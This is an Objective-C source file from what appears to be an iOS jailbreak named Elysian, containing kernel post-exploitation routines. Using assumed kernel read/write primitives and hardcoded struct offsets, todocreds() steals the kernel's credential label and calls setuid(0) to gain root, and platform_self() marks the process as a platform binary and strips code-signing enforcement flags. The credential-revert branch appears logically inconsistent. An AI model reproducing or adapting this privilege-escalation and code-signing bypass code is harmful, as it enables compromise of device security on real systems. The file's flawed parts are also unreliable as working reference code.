//
//  jbtools.m
//  Elysian
//
//  Created by chris  on 4/27/20.
//  Copyright © 2020 chr1s_0x1. All rights reserved.
//

#import <Foundation/Foundation.h>
#import "utils.h"
#import "offsets.h"
#import "kernel_memory.h"
#import "jbtools.h"

let TF_PLATFORM = (UInt32)(0x00000400);

let CS_VALID = (UInt32)0x00000001;
let CS_GET_TASK_ALLOW = (UInt32)(0x00000004);
let CS_INSTALLER = (UInt32)(0x00000008);

let CS_HARD = (UInt32)(0x00000100);
let CS_KILL = (UInt32)(0x00000200);
let CS_RESTRICT = (UInt32)(0x00000800);

let CS_PLATFORM_BINARY = (UInt32)(0x04000000);
let CS_DEBUGGED = (UInt32)(0x10000000);

int todocreds(uint64_t kernproc, int todo) {
    if(todo > 1 || todo < 0) {
        LOG("ERR: integer todo must be 0 or 1\n");
        return 1;
    }
    if(todo == 0) {
        // find creds..
    LOG("[todocreds] Borrowing kernel creds..\n");
    LOGM("[todocreds] kernel proc: 0x%llx\n", kernproc);
    let our_task = find_self_task();
    let our_proc = rk64(our_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
    LOGM("[todocreds] our proc: 0x%llx\n", our_proc);
    let our_creds = rk64(our_proc + 0x100);
    let our_label = rk64(our_creds + 0x78);
    let kern_ucred = rk64(kernproc + 0x100);
    // steal >:)
    wk64(our_creds + 0x78, rk64(kern_ucred + 0x78));
    wk32(our_creds + 0x20, (UInt32)0);
    LOG("[todocreds] Got kernel creds\n");
    LOG("[todocreds] Setting uid to 0..\n");
    setuid(0);
    setuid(0);
    wk64(our_creds + 0x78, our_label);
        if(getuid() != 0) {
            LOG("[todocreds] ERR: Failed to set uid 0\n");
            return 1;
        }
    LOGM("[todocreds] our uid is %d\n", getuid());
        
    LOG("[todocreds] done\n");
    return 0;
    } else if (todo == 1) {
        // revert creds..
        LOG("[todocreds] Reverting creds..\n");
        let our_task = find_self_task();
        let our_proc = rk64(our_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
        LOGM("[todocreds] our proc: 0x%llx\n", our_proc);
        let our_creds = rk64(our_proc + 0x100);
        wk64(our_proc + 0x100, our_creds);
        let our_label = rk64(our_creds + 0x78);
        wk64(our_creds + 0x78, our_label);
        let our_svuid = rk32(our_creds + 0x20);
        wk32(our_label + 0x20, our_svuid);
        setuid(501);
        LOG("[todocreds] Reverted creds\n");
        return 0;
    }
    return 0;
}

int platform_self(uint64_t ourtask) {
    LOG("[platform] Platforming task..\n");
    let our_task = find_self_task();
    let our_proc = rk64(our_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
#if __arm64e__
    let our_flags = rk32(ourtask + 0x3C0);
    wk32(ourtask + 0x3C0, our_flags | TF_PLATFORM);
#else
    let our_flags = rk32(ourtask + 0x3B8);
    wk32(ourtask + 0x3B8, our_flags | TF_PLATFORM);
#endif
    var our_csflags = rk32(our_proc + 0x298);
    our_csflags = our_csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW;
    our_csflags &= ~(CS_RESTRICT | CS_HARD | CS_KILL);
    wk32(our_proc + 0x298, our_csflags);
    LOG("[platform] Platformized task\n");
    return 0;
}
